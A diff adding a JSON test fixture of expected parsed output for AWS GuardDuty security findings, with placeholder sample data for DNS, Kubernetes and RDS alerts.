@@ -1,0 +1,1132 @@
+{
+  "expected": [
+    {
+      "@timestamp": "2050-11-22T12:22:20.934Z",
+      "aws": {
+        "guardduty": {
+          "account_id": "123412341234",
+          "arn": "arn:aws:guardduty:us-east-1:123412341234:detector/d60123456789e5461eabcd1234abcd1234/finding/d6012345678912345678912349f831b8f",
+          "created_at": "2050-11-17T09:33:19.224Z",
+          "description": "EC2 instance i-99999999 is querying a domain name of a blackholed domain.",
+          "id": "d6012345678912345678912349f831b8f",
+          "partition": "aws",
+          "region": "us-east-1",
+          "resource": {
+            "instance_details": {
+              "availability_zone": "GeneratedFindingInstaceAvailabilityZone",
+              "iaminstance_profile": {
+                "arn": "arn:aws:iam::123412341234:example/instance/profile",
+                "id": "GeneratedFindingInstanceProfileId"
+              },
+              "image": {
+                "description": "GeneratedFindingInstaceImageDescription",
+                "id": "ami-99999999"
+              },
+              "instance": {
+                "id": "i-99999999",
+                "state": "running",
+                "type": "m3.xlarge"
+              },
+              "launch_time": "2044-08-02T02:05:06.000Z",
+              "network_interfaces": [
+                {
+                  "network_interface_id": "eni-abcdef888",
+                  "private": {
+                    "dns_name": "GeneratedFindingPrivateDnsName",
+                    "ip_address": "192.0.2.87",
+                    "ip_addresses": [
+                      {
+                        "private": {
+                          "dns_name": "GeneratedFindingPrivateName",
+                          "ip_address": "192.0.2.87"
+                        }
+                      }
+                    ]
+                  },
+                  "public": {
+                    "dns_name": "GeneratedFindingPublicDNSName",
+                    "ip": "192.0.2.87"
+                  },
+                  "security_groups": [
+                    {
+                      "group": {
+                        "id": "GeneratedFindingSecurityId",
+                        "name": "GeneratedFindingSecurityGroupName"
+                      }
+                    }
+                  ],
+                  "subnet_id": "GeneratedFindingSubnetId",
+                  "vpc_id": "GeneratedFindingVPCId"
+                }
+              ],
+              "outpost_arn": "arn:aws:outposts:us-west-2:123456789000:outpost/op-abcdefabcdef1234",
+              "product_codes": [
+                {
+                  "product_code": {
+                    "id": "GeneratedFindingProductCodeId",
+                    "type": "GeneratedFindingProductCodeType"
+                  }
+                }
+              ],
+              "tags": [
+                {
+                  "key": "GeneratedFindingInstaceTag1",
+                  "value": "GeneratedFindingInstaceValue1"
+                },
+                {
+                  "key": "GeneratedFindingInstaceTag2",
+                  "value": "GeneratedFindingInstaceTagValue2"
+                },
+                {
+                  "key": "GeneratedFindingInstaceTag3",
+                  "value": "GeneratedFindingInstaceTagValue3"
+                },
+                {
+                  "key": "GeneratedFindingInstaceTag4",
+                  "value": "GeneratedFindingInstaceTagValue4"
+                },
+                {
+                  "key": "GeneratedFindingInstaceTag5",
+                  "value": "GeneratedFindingInstaceTagValue5"
+                },
+                {
+                  "key": "GeneratedFindingInstaceTag6",
+                  "value": "GeneratedFindingInstaceTagValue6"
+                },
+                {
+                  "key": "GeneratedFindingInstaceTag7",
+                  "value": "GeneratedFindingInstaceTagValue7"
+                },
+                {
+                  "key": "GeneratedFindingInstaceTag8",
+                  "value": "GeneratedFindingInstaceTagValue8"
+                },
+                {
+                  "key": "GeneratedFindingInstaceTag9",
+                  "value": "GeneratedFindingInstaceTagValue9"
+                }
+              ]
+            },
+            "type": "Instance"
+          },
+          "schema_version": "2.0",
+          "service": {
+            "action": {
+              "dns_request_action": {
+                "blocked": true,
+                "domain": "GeneratedFindingDomainName",
+                "protocol": "UDP"
+              },
+              "type": "DNS_REQUEST"
+            },
+            "additional_info": {
+              "sample": true,
+              "threatListName": "GeneratedFindingThreatListName",
+              "type": "default",
+              "value": "{\"threatListName\":\"GeneratedFindingThreatListName\",\"sample\":true}"
+            },
+            "archived": false,
+            "count": 2,
+            "detector_id": "d60123456789e5461eabcd1234abcd1234",
+            "event": {
+              "first_seen": "2050-11-17T09:33:19.000Z",
+              "last_seen": "2050-11-22T12:22:20.000Z"
+            },
+            "evidence": {
+              "threat_intelligence_details": [
+                {
+                  "threat": {
+                    "list_name": "GeneratedFindingThreatListName",
+                    "names": [
+                      "GeneratedFindingThreatName"
+                    ]
+                  }
+                }
+              ]
+            },
+            "resource_role": "TARGET",
+            "service_name": "guardduty"
+          },
+          "severity": {
+            "code": 5.0,
+            "value": "Medium"
+          },
+          "title": "Blackholed domain name queried by EC2 instance i-99999999.",
+          "type": "Trojan:EC2/BlackholeTraffic!DNS",
+          "updated_at": "2050-11-22T12:22:20.934Z"
+        }
+      },
+      "cloud": {
+        "account": {
+          "id": "123412341234"
+        },
+        "instance": {
+          "id": "i-99999999"
+        },
+        "machine": {
+          "type": "m3.xlarge"
+        },
+        "provider": "aws",
+        "region": "us-east-1",
+        "service": {
+          "name": "guardduty"
+        }
+      },
+      "dns": {
+        "question": {
+          "name": "GeneratedFindingDomainName"
+        }
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "action": "DNS_REQUEST",
+        "created": "2050-11-17T09:33:19.224Z",
+        "end": "2050-11-22T12:22:20.000Z",
+        "id": "d6012345678912345678912349f831b8f",
+        "kind": [
+          "alert"
+        ],
+        "original": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123412341234\",\"region\":\"us-east-1\",\"partition\":\"aws\",\"id\":\"d6012345678912345678912349f831b8f\",\"arn\":\"arn:aws:guardduty:us-east-1:123412341234:detector/d60123456789e5461eabcd1234abcd1234/finding/d6012345678912345678912349f831b8f\",\"type\":\"Trojan:EC2/BlackholeTraffic!DNS\",\"resource\":{\"resourceType\":\"Instance\",\"instanceDetails\":{\"instanceId\":\"i-99999999\",\"instanceType\":\"m3.xlarge\",\"outpostArn\":\"arn:aws:outposts:us-west-2:123456789000:outpost/op-abcdefabcdef1234\",\"launchTime\":\"2044-08-02T02:05:06.000Z\",\"platform\":null,\"productCodes\":[{\"productCodeId\":\"GeneratedFindingProductCodeId\",\"productCodeType\":\"GeneratedFindingProductCodeType\"}],\"iamInstanceProfile\":{\"arn\":\"arn:aws:iam::123412341234:example/instance/profile\",\"id\":\"GeneratedFindingInstanceProfileId\"},\"networkInterfaces\":[{\"networkInterfaceId\":\"eni-abcdef888\",\"privateIpAddresses\":[{\"privateDnsName\":\"GeneratedFindingPrivateName\",\"privateIpAddress\":\"192.0.2.87\"}],\"subnetId\":\"GeneratedFindingSubnetId\",\"vpcId\":\"GeneratedFindingVPCId\",\"privateDnsName\":\"GeneratedFindingPrivateDnsName\",\"securityGroups\":[{\"groupName\":\"GeneratedFindingSecurityGroupName\",\"groupId\":\"GeneratedFindingSecurityId\"}],\"publicIp\":\"192.0.2.87\",\"ipv6Addresses\":[],\"publicDnsName\":\"GeneratedFindingPublicDNSName\",\"privateIpAddress\":\"192.0.2.87\"}],\"tags\":[{\"value\":\"GeneratedFindingInstaceValue1\",\"key\":\"GeneratedFindingInstaceTag1\"},{\"value\":\"GeneratedFindingInstaceTagValue2\",\"key\":\"GeneratedFindingInstaceTag2\"},{\"value\":\"GeneratedFindingInstaceTagValue3\",\"key\":\"GeneratedFindingInstaceTag3\"},{\"value\":\"GeneratedFindingInstaceTagValue4\",\"key\":\"GeneratedFindingInstaceTag4\"},{\"value\":\"GeneratedFindingInstaceTagValue5\",\"key\":\"GeneratedFindingInstaceTag5\"},{\"value\":\"GeneratedFindingInstaceTagValue6\",\"key\":\"GeneratedFindingInstaceTag6\"},{\"value\":\"GeneratedFindingInstaceTagValue7\",\"key\":\"GeneratedFindingInstaceTag7\"},{\"value\":\"GeneratedFindingInstaceTagValue8\",\"key\":\"GeneratedFindingInstaceTag8\"},{\"value\":\"GeneratedFindingInstaceTagValue9\",\"key\":\"GeneratedFindingInstaceTag9\"}],\"instanceState\":\"running\",\"availabilityZone\":\"GeneratedFindingInstaceAvailabilityZone\",\"imageId\":\"ami-99999999\",\"imageDescription\":\"GeneratedFindingInstaceImageDescription\"}},\"service\":{\"serviceName\":\"guardduty\",\"detectorId\":\"d60123456789e5461eabcd1234abcd1234\",\"action\":{\"actionType\":\"DNS_REQUEST\",\"dnsRequestAction\":{\"domain\":\"GeneratedFindingDomainName\",\"protocol\":\"UDP\",\"blocked\":true}},\"resourceRole\":\"TARGET\",\"additionalInfo\":{\"threatListName\":\"GeneratedFindingThreatListName\",\"sample\":true,\"value\":\"{\\\"threatListName\\\":\\\"GeneratedFindingThreatListName\\\",\\\"sample\\\":true}\",\"type\":\"default\"},\"evidence\":{\"threatIntelligenceDetails\":[{\"threatNames\":[\"GeneratedFindingThreatName\"],\"threatListName\":\"GeneratedFindingThreatListName\"}]},\"eventFirstSeen\":\"2050-11-17T09:33:19.000Z\",\"eventLastSeen\":\"2050-11-22T12:22:20.000Z\",\"archived\":false,\"count\":2},\"severity\":5,\"createdAt\":\"2050-11-17T09:33:19.224Z\",\"updatedAt\":\"2050-11-22T12:22:20.934Z\",\"title\":\"Blackholed domain name queried by EC2 instance i-99999999.\",\"description\":\"EC2 instance i-99999999 is querying a domain name of a blackholed domain.\"}",
+        "severity": 5,
+        "start": "2050-11-17T09:33:19.000Z",
+        "type": [
+          "info"
+        ]
+      },
+      "host": {
+        "id": "i-99999999",
+        "type": "m3.xlarge"
+      },
+      "message": "EC2 instance i-99999999 is querying a domain name of a blackholed domain.",
+      "network": {
+        "transport": [
+          "udp"
+        ]
+      },
+      "related": {
+        "hosts": [
+          "GeneratedFindingDomainName"
+        ],
+        "ip": [
+          "192.0.2.87"
+        ]
+      },
+      "rule": {
+        "category": "Trojan",
+        "name": "Trojan:EC2/BlackholeTraffic!DNS",
+        "ruleset": "Trojan:EC2"
+      },
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "@timestamp": "2050-11-22T12:22:20.935Z",
+      "aws": {
+        "guardduty": {
+          "account_id": "123412341234",
+          "arn": "arn:aws:guardduty:us-east-1:123412341234:detector/abddcde15bc7306fcbcf9452daef3891/finding/250023a9abcdefabcdef12345678",
+          "created_at": "2050-11-17T09:33:19.225Z",
+          "description": "Kubernetes API commonly used in Persistence tactics was invoked on cluster GeneratedFindingEKSClusterName by the anonymous user system:anonymous.",
+          "id": "250023a9abcdefabcdef12345678",
+          "partition": "aws",
+          "region": "us-east-1",
+          "resource": {
+            "eks_cluster_details": {
+              "arn": "GeneratedFindingEKSClusterArn",
+              "created_at": "2049-11-11T10:15:55.218Z",
+              "name": "GeneratedFindingEKSClusterName",
+              "status": "ACTIVE",
+              "tags": [
+                {
+                  "key": "GeneratedFindingEKSClusterTag1",
+                  "value": "GeneratedFindingEKSClusterTagValue1"
+                },
+                {
+                  "key": "GeneratedFindingEKSClusterTag2",
+                  "value": "GeneratedFindingEKSClusterTagValue2"
+                },
+                {
+                  "key": "GeneratedFindingEKSClusterTag3",
+                  "value": "GeneratedFindingEKSClusterTagValue3"
+                }
+              ],
+              "vpcid": "GeneratedFindingEKSClusterVpcId"
+            },
+            "kubernetes_details": {
+              "kubernetes_user_details": {
+                "groups": [
+                  "system:unauthenticated"
+                ],
+                "uid": "GeneratedFindingUID",
+                "user_name": "system:anonymous"
+              }
+            },
+            "type": "EKSCluster"
+          },
+          "schema_version": "2.0",
+          "service": {
+            "action": {
+              "kubernetes_api_call_action": {
+                "parameters": "GeneratedFindingActionParameters",
+                "remote_ip_details": {
+                  "city": {
+                    "name": "GeneratedFindingCityName"
+                  },
+                  "country": {
+                    "name": "GeneratedFindingCountryName"
+                  },
+                  "geo_location": {
+                    "lat": 0,
+                    "lon": 0
+                  },
+                  "ip_address_v4": "192.0.2.87",
+                  "organization": {
+                    "asn": "0",
+                    "asnorg": "GeneratedFindingASNOrg",
+                    "isp": "GeneratedFindingISP",
+                    "org": "GeneratedFindingORG"
+                  }
+                },
+                "request_uri": "GeneratedFindingRequestURI",
+                "source_ips": [
+                  "192.0.2.87"
+                ],
+                "status_code": 200,
+                "verb": "get"
+              },
+              "type": "KUBERNETES_API_CALL"
+            },
+            "additional_info": {
+              "sample": true,
+              "type": "default",
+              "value": "{\"sample\":true}"
+            },
+            "archived": false,
+            "count": 2,
+            "detector_id": "abddcde15bc7306fcbcf9452daef3891",
+            "event": {
+              "first_seen": "2050-11-17T09:33:19.000Z",
+              "last_seen": "2050-11-22T12:22:20.000Z"
+            },
+            "resource_role": "TARGET",
+            "service_name": "guardduty"
+          },
+          "severity": {
+            "code": 8.0,
+            "value": "High"
+          },
+          "title": "Kubernetes API commonly used in Persistence tactics invoked by the anonymous user.",
+          "type": "Persistence:Kubernetes/SuccessfulAnonymousAccess",
+          "updated_at": "2050-11-22T12:22:20.935Z"
+        }
+      },
+      "cloud": {
+        "account": {
+          "id": "123412341234"
+        },
+        "provider": "aws",
+        "region": "us-east-1",
+        "service": {
+          "name": "guardduty"
+        }
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "action": "KUBERNETES_API_CALL",
+        "created": "2050-11-17T09:33:19.225Z",
+        "end": "2050-11-22T12:22:20.000Z",
+        "id": "250023a9abcdefabcdef12345678",
+        "kind": [
+          "alert"
+        ],
+        "original": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123412341234\",\"region\":\"us-east-1\",\"partition\":\"aws\",\"id\":\"250023a9abcdefabcdef12345678\",\"arn\":\"arn:aws:guardduty:us-east-1:123412341234:detector/abddcde15bc7306fcbcf9452daef3891/finding/250023a9abcdefabcdef12345678\",\"type\":\"Persistence:Kubernetes/SuccessfulAnonymousAccess\",\"resource\":{\"resourceType\":\"EKSCluster\",\"eksClusterDetails\":{\"name\":\"GeneratedFindingEKSClusterName\",\"arn\":\"GeneratedFindingEKSClusterArn\",\"createdAt\":2520238555.218,\"vpcId\":\"GeneratedFindingEKSClusterVpcId\",\"status\":\"ACTIVE\",\"tags\":[{\"value\":\"GeneratedFindingEKSClusterTagValue1\",\"key\":\"GeneratedFindingEKSClusterTag1\"},{\"value\":\"GeneratedFindingEKSClusterTagValue2\",\"key\":\"GeneratedFindingEKSClusterTag2\"},{\"value\":\"GeneratedFindingEKSClusterTagValue3\",\"key\":\"GeneratedFindingEKSClusterTag3\"}]},\"kubernetesDetails\":{\"kubernetesWorkloadDetails\":null,\"kubernetesUserDetails\":{\"username\":\"system:anonymous\",\"uid\":\"GeneratedFindingUID\",\"groups\":[\"system:unauthenticated\"]}}},\"service\":{\"serviceName\":\"guardduty\",\"detectorId\":\"abddcde15bc7306fcbcf9452daef3891\",\"action\":{\"actionType\":\"KUBERNETES_API_CALL\",\"kubernetesApiCallAction\":{\"requestUri\":\"GeneratedFindingRequestURI\",\"verb\":\"get\",\"sourceIPs\":[\"192.0.2.87\"],\"userAgent\":\"\",\"remoteIpDetails\":{\"ipAddressV4\":\"192.0.2.87\",\"organization\":{\"asn\":\"0\",\"asnOrg\":\"GeneratedFindingASNOrg\",\"isp\":\"GeneratedFindingISP\",\"org\":\"GeneratedFindingORG\"},\"country\":{\"countryName\":\"GeneratedFindingCountryName\"},\"city\":{\"cityName\":\"GeneratedFindingCityName\"},\"geoLocation\":{\"lat\":0,\"lon\":0}},\"statusCode\":200,\"parameters\":\"GeneratedFindingActionParameters\"}},\"resourceRole\":\"TARGET\",\"additionalInfo\":{\"sample\":true,\"value\":\"{\\\"sample\\\":true}\",\"type\":\"default\"},\"evidence\":null,\"eventFirstSeen\":\"2050-11-17T09:33:19.000Z\",\"eventLastSeen\":\"2050-11-22T12:22:20.000Z\",\"archived\":false,\"count\":2},\"severity\":8,\"createdAt\":\"2050-11-17T09:33:19.225Z\",\"updatedAt\":\"2050-11-22T12:22:20.935Z\",\"title\":\"Kubernetes API commonly used in Persistence tactics invoked by the anonymous user.\",\"description\":\"Kubernetes API commonly used in Persistence tactics was invoked on cluster GeneratedFindingEKSClusterName by the anonymous user system:anonymous.\"}",
+        "severity": 8,
+        "start": "2050-11-17T09:33:19.000Z",
+        "type": [
+          "info"
+        ]
+      },
+      "message": "Kubernetes API commonly used in Persistence tactics was invoked on cluster GeneratedFindingEKSClusterName by the anonymous user system:anonymous.",
+      "related": {
+        "ip": [
+          "192.0.2.87"
+        ],
+        "user": [
+          "GeneratedFindingUID",
+          "system:anonymous"
+        ]
+      },
+      "rule": {
+        "category": "Persistence",
+        "name": "Persistence:Kubernetes/SuccessfulAnonymousAccess",
+        "ruleset": "Persistence:Kubernetes"
+      },
+      "source": {
+        "address": [
+          "192.0.2.87"
+        ],
+        "as": {
+          "number": [
+            0
+          ],
+          "organization": {
+            "name": [
+              "GeneratedFindingASNOrg"
+            ]
+          }
+        },
+        "geo": {
+          "city_name": [
+            "GeneratedFindingCityName"
+          ],
+          "country_name": [
+            "GeneratedFindingCountryName"
+          ],
+          "location": [
+            {
+              "lat": 0,
+              "lon": 0
+            }
+          ]
+        },
+        "ip": [
+          "192.0.2.87"
+        ]
+      },
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ],
+      "user": {
+        "id": [
+          "GeneratedFindingUID"
+        ],
+        "name": [
+          "system:anonymous"
+        ],
+        "roles": [
+          "system:unauthenticated"
+        ]
+      }
+    },
+    {
+      "@timestamp": "2050-11-22T12:22:20.938Z",
+      "aws": {
+        "guardduty": {
+          "account_id": "123412341234",
+          "arn": "arn:aws:guardduty:us-east-1:123412341234:detector/12341234e19ce5461eabcd1234abcd1234/finding/76e0bbfedecfdedbade4333922609164",
+          "created_at": "2050-11-17T09:33:19.228Z",
+          "description": "Kubernetes API commonly used in Discovery tactics was invoked on cluster GeneratedFindingEKSClusterName from Tor exit node IP address 192.0.2.87.",
+          "id": "76e0bbfedecfdedbade4333922609164",
+          "partition": "aws",
+          "region": "us-east-1",
+          "resource": {
+            "access_key_details": {
+              "accesskey_id": "GeneratedFindingAccessKeyId",
+              "principal_id": "GeneratedFindingPrincipalId",
+              "user": {
+                "name": "PficnbsefEpzcmpzRybsRakc",
+                "type": "Role"
+              }
+            },
+            "eks_cluster_details": {
+              "arn": "GeneratedFindingEKSClusterArn",
+              "created_at": "2049-11-03T18:00:10.342Z",
+              "name": "GeneratedFindingEKSClusterName",
+              "status": "ACTIVE",
+              "tags": [
+                {
+                  "key": "GeneratedFindingEKSClusterTag1",
+                  "value": "GeneratedFindingEKSClusterTagValue1"
+                },
+                {
+                  "key": "GeneratedFindingEKSClusterTag2",
+                  "value": "GeneratedFindingEKSClusterTagValue2"
+                },
+                {
+                  "key": "GeneratedFindingEKSClusterTag3",
+                  "value": "GeneratedFindingEKSClusterTagValue3"
+                }
+              ],
+              "vpcid": "GeneratedFindingEKSClusterVpcId"
+            },
+            "kubernetes_details": {
+              "kubernetes_user_details": {
+                "groups": [
+                  "GeneratedFindingUserGroup"
+                ],
+                "uid": "GeneratedFindingUID",
+                "user_name": "PficnbsefEpzcmpzRybsRakc"
+              }
+            },
+            "type": "EKSCluster"
+          },
+          "schema_version": "2.0",
+          "service": {
+            "action": {
+              "kubernetes_api_call_action": {
+                "remote_ip_details": {
+                  "city": {
+                    "name": "GeneratedFindingCityName"
+                  },
+                  "country": {
+                    "name": "GeneratedFindingCountryName"
+                  },
+                  "geo_location": {
+                    "lat": 0,
+                    "lon": 0
+                  },
+                  "ip_address_v4": "192.0.2.87",
+                  "organization": {
+                    "asn": "0",
+                    "asnorg": "GeneratedFindingASNOrg",
+                    "isp": "GeneratedFindingISP",
+                    "org": "GeneratedFindingORG"
+                  }
+                },
+                "request_uri": "GeneratedFindingRequestURI",
+                "source_ips": [
+                  "192.0.2.87"
+                ],
+                "status_code": 200,
+                "verb": "list"
+              },
+              "type": "KUBERNETES_API_CALL"
+            },
+            "additional_info": {
+              "sample": true,
+              "threatListName": "GeneratedFindingThreatListName",
+              "threatName": "GeneratedFindingThreatName",
+              "type": "default",
+              "value": "{\"threatName\":\"GeneratedFindingThreatName\",\"threatListName\":\"GeneratedFindingThreatListName\",\"sample\":true}"
+            },
+            "archived": false,
+            "count": 2,
+            "detector_id": "12341234e19ce5461eabcd1234abcd1234",
+            "event": {
+              "first_seen": "2050-11-17T09:33:19.000Z",
+              "last_seen": "2050-11-22T12:22:20.000Z"
+            },
+            "evidence": {
+              "threat_intelligence_details": [
+                {
+                  "threat": {
+                    "list_name": "GeneratedFindingThreatListName",
+                    "names": [
+                      "GeneratedFindingThreatName"
+                    ]
+                  }
+                }
+              ]
+            },
+            "resource_role": "TARGET",
+            "service_name": "guardduty"
+          },
+          "severity": {
+            "code": 5.0,
+            "value": "Medium"
+          },
+          "title": "Kubernetes API commonly used in Discovery tactics invoked from a Tor exit node IP address.",
+          "type": "Discovery:Kubernetes/TorIPCaller",
+          "updated_at": "2050-11-22T12:22:20.938Z"
+        }
+      },
+      "cloud": {
+        "account": {
+          "id": "123412341234"
+        },
+        "provider": "aws",
+        "region": "us-east-1",
+        "service": {
+          "name": "guardduty"
+        }
+      },
+      "ecs": {
+        "version": "8.11.0"
+      },
+      "event": {
+        "action": "KUBERNETES_API_CALL",
+        "created": "2050-11-17T09:33:19.228Z",
+        "end": "2050-11-22T12:22:20.000Z",
+        "id": "76e0bbfedecfdedbade4333922609164",
+        "kind": [
+          "alert"
+        ],
+        "original": "{\"schemaVersion\":\"2.0\",\"accountId\":\"123412341234\",\"region\":\"us-east-1\",\"partition\":\"aws\",\"id\":\"76e0bbfedecfdedbade4333922609164\",\"arn\":\"arn:aws:guardduty:us-east-1:123412341234:detector/12341234e19ce5461eabcd1234abcd1234/finding/76e0bbfedecfdedbade4333922609164\",\"type\":\"Discovery:Kubernetes/TorIPCaller\",\"resource\":{\"resourceType\":\"EKSCluster\",\"eksClusterDetails\":{\"name\":\"GeneratedFindingEKSClusterName\",\"arn\":\"GeneratedFindingEKSClusterArn\",\"createdAt\":2519575210.342,\"vpcId\":\"GeneratedFindingEKSClusterVpcId\",\"status\":\"ACTIVE\",\"tags\":[{\"value\":\"GeneratedFindingEKSClusterTagValue1\",\"key\":\"GeneratedFindingEKSClusterTag1\"},{\"value\":\"GeneratedFindingEKSClusterTagValue2\",\"key\":\"GeneratedFindingEKSClusterTag2\"},{\"value\":\"GeneratedFindingEKSClusterTagValue3\",\"key\":\"GeneratedFindingEKSClusterTag3\"}]},\"kubernetesDetails\":{\"kubernetesWorkloadDetails\":null,\"kubernetesUserDetails\":{\"username\":\"PficnbsefEpzcmpzRybsRakc\",\"uid\":\"GeneratedFindingUID\",\"groups\":[\"GeneratedFindingUserGroup\"]}},\"accessKeyDetails\":{\"accessKeyId\":\"GeneratedFindingAccessKeyId\",\"principalId\":\"GeneratedFindingPrincipalId\",\"userType\":\"Role\",\"userName\":\"PficnbsefEpzcmpzRybsRakc\"}},\"service\":{\"serviceName\":\"guardduty\",\"detectorId\":\"12341234e19ce5461eabcd1234abcd1234\",\"action\":{\"actionType\":\"KUBERNETES_API_CALL\",\"kubernetesApiCallAction\":{\"requestUri\":\"GeneratedFindingRequestURI\",\"verb\":\"list\",\"sourceIPs\":[\"192.0.2.87\"],\"userAgent\":\"\",\"remoteIpDetails\":{\"ipAddressV4\":\"192.0.2.87\",\"organization\":{\"asn\":\"0\",\"asnOrg\":\"GeneratedFindingASNOrg\",\"isp\":\"GeneratedFindingISP\",\"org\":\"GeneratedFindingORG\"},\"country\":{\"countryName\":\"GeneratedFindingCountryName\"},\"city\":{\"cityName\":\"GeneratedFindingCityName\"},\"geoLocation\":{\"lat\":0,\"lon\":0}},\"statusCode\":200}},\"resourceRole\":\"TARGET\",\"additionalInfo\":{\"threatName\":\"GeneratedFindingThreatName\",\"threatListName\":\"GeneratedFindingThreatListName\",\"sample\":true,\"value\":\"{\\\"threatName\\\":\\\"GeneratedFindingThreatName\\\",\\\"threatListName\\\":\\\"GeneratedFindingThreatListName\\\",\\\"sample\\\":true}\",\"type\":\"default\"},\"evidence\":{\"threatIntelligenceDetails\":[{\"threatNames\":[\"GeneratedFindingThreatName\"],\"threatListName\":\"GeneratedFindingThreatListName\"}]},\"eventFirstSeen\":\"2050-11-17T09:33:19.000Z\",\"eventLastSeen\":\"2050-11-22T12:22:20.000Z\",\"archived\":false,\"count\":2},\"severity\":5,\"createdAt\":\"2050-11-17T09:33:19.228Z\",\"updatedAt\":\"2050-11-22T12:22:20.938Z\",\"title\":\"Kubernetes API commonly used in Discovery tactics invoked from a Tor exit node IP address.\",\"description\":\"Kubernetes API commonly used in Discovery tactics was invoked on cluster GeneratedFindingEKSClusterName from Tor exit node IP address 192.0.2.87.\"}",
+        "severity": 5,
+        "start": "2050-11-17T09:33:19.000Z",
+        "type": [
+          "info"
+        ]
+      },
+      "message": "Kubernetes API commonly used in Discovery tactics was invoked on cluster GeneratedFindingEKSClusterName from Tor exit node IP address 192.0.2.87.",
+      "related": {
+        "ip": [
+          "192.0.2.87"
+        ],
+        "user": [
+          "GeneratedFindingPrincipalId",
+          "PficnbsefEpzcmpzRybsRakc",
+          "GeneratedFindingUID"
+        ]
+      },
+      "rule": {
+        "category": "Discovery",
+        "name": "Discovery:Kubernetes/TorIPCaller",
+        "ruleset": "Discovery:Kubernetes"
+      },
+      "source": {
+        "address": [
+          "192.0.2.87"
+        ],
+        "as": {
+          "number": [
+            0
+          ],
+          "organization": {
+            "name": [
+              "GeneratedFindingASNOrg"
+            ]
+          }
+        },
+        "geo": {
+          "city_name": [
+            "GeneratedFindingCityName"
+          ],
+          "country_name": [
+            "GeneratedFindingCountryName"
+          ],
+          "location": [
+            {
+              "lat": 0,
+              "lon": 0
+            }
+          ]
+        },
+        "ip": [
+          "192.0.2.87"
+        ]
+      },
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ],
+      "user": {
+        "id": [
+          "GeneratedFindingPrincipalId",
+          "GeneratedFindingUID"
+        ],
+        "name": [
+          "PficnbsefEpzcmpzRybsRakc"
+        ],
+        "roles": [
+          "GeneratedFindingUserGroup"
+        ]
+      }
+    },
+    {
+      "@timestamp": "2050-12-07T10:28:35.948Z",
+      "aws": {
+        "guardduty": {
+          "account_id": "123412341234",
+          "arn": "arn:aws:guardduty:us-east-1:123412341234:detector/4ec22961e1defabcdefabcdef2a1234/finding/6beccaafbcbcabdcebc0a028025900f4",
+          "created_at": "2050-12-07T10:28:35.948Z",
+          "description": "Unusual successful login by PficnbsefEpzcmpzRybsRakc observed on RDS instance GeneratedFindingDBInstanceId.",
+          "id": "6beccaafbcbcabdcebc0a028025900f4",
+          "partition": "aws",
+          "region": "us-east-1",
+          "resource": {
+            "rdsdb_instance_details": {
+              "cluster_identifier": "GeneratedFindingDBClusterId",
+              "engine": "GeneratedFindingEngine",
+              "engine_version": "13.6",
+              "instance_arn": "arn:aws:rds:us-east-1:123456789000:db:GeneratedFindingDBInstanceId",
+              "instance_identifier": "GeneratedFindingDBInstanceId"
+            },
+            "rdsdb_user_details": {
+              "application": "GeneratedFindingApplicationName",
+              "auth_method": "GeneratedFindingAuthMethod",
+              "database": "GeneratedFindingDatabaseName",
+              "ssl": "GeneratedSSLValue",
+              "user": "PficnbsefEpzcmpzRybsRakc"
+            },
+            "type": "RDSDBInstance"
+          },
+          "schema_version": "2.0",
+          "service": {
+            "action": {
+              "rds_login_attempt_action": {
+                "remote_ip_details": {
+                  "city": {
+                    "name": "GeneratedFindingCityName"
+                  },
+                  "country": {
+                    "name": "GeneratedFindingCountryName"
+                  },
+                  "geo_location": {
+                    "lat": 0,
+                    "lon": 0
+                  },
+                  "ip_address_v4": "192.0.2.87",
+                  "organization": {
+                    "asn": "0",
+                    "asnorg": "GeneratedFindingAsnOrg",
+                    "isp": "GeneratedFindingIsp",
+                    "org": "GeneratedFindingOrg"
+                  }
+                }
+              },
+              "type": "RDS_LOGIN_ATTEMPT"
+            },
+            "additional_info": {
+              "sample": true,
+              "type": "default",
+              "unusualBehavior": {
+                "unusualASNClusterProfiling": {
+                  "asnOrg": "GeneratedFindingAsnOrg",
+                  "failedLoginCount": 0,
+                  "incompleteConnectionCount": 0,
+                  "successfulLoginCount": 10
+                },
+                "unusualApplicationNameClusterProfiling": {
+                  "applicationName": "GeneratedFindingApplicationName",
+                  "failedLoginCount": 0,
+                  "incompleteConnectionCount": 0,
+                  "successfulLoginCount": 1
+                },
+                "unusualDatabaseNameClusterProfiling": {
+                  "databaseName": "GeneratedFindingDatabaseName",
+                  "failedLoginCount": 0,
+                  "incompleteConnectionCount": 0,
+                  "successfulLoginCount": 1
+                },
+                "unusualUserNameClusterProfiling": {
+                  "failedLoginCount": 0,
+                  "incompleteConnectionCount": 0,
+                  "successfulLoginCount": 1,
+                  "userName": "PficnbsefEpzcmpzRybsRakc"
+                }
+              },
+              "value": "{\"unusualBehavior\":{\"unusualUserNameClusterProfiling\":{\"userName\":\"PficnbsefEpzcmpzRybsRakc\",\"failedLoginCount\":0,\"successfulLoginCount\":1,\"incompleteConnectionCount\":0},\"unusualASNClusterProfiling\":{\"asnOrg\":\"GeneratedFindingAsnOrg\",\"failedLoginCount\":0,\"successfulLoginCount\":10,\"incompleteConnectionCount\":0},\"unusualApplicationNameClusterProfiling\":{\"applicationName\":\"GeneratedFindingApplicationName\",\"failedLoginCount\":0,\"successfulLoginCount\":1,\"incompleteConnectionCount\":0},\"unusualDatabaseNameClusterProfiling\":{\"databaseName\":\"GeneratedFindingDatabaseName\",\"failedLoginCount\":0,\"successfulLoginCount\":1,\"incompleteConnectionCount\":0}},\"sample\":true}"
+            },
+            "archived": false,
+            "count": 1,
+            "detector_id": "4ec22961e1defabcdefabcdef2a1234",
+            "event": {
+              "first_seen": "2050-12-07T10:28:35.000Z",
+              "last_seen": "2050-12-07T10:28:35.000Z"
+            },
+            "resource_role": "TARGET",
+            "service_name": "guardduty"
+          },
+          "severity": {
+            "code": 8.0,
+            "value": "High"
+          },
+          "title": "Unusual successful login by PficnbsefEpzcmpzRybsRakc observed on RDS instance GeneratedFindingDBInstanceId.",
+          "type": "CredentialAccess:RDS/AnomalousBehavior.SuccessfulLogin",
+          "updated_at": "2050-12-07T10:28:35.948Z"
+        }
+      },
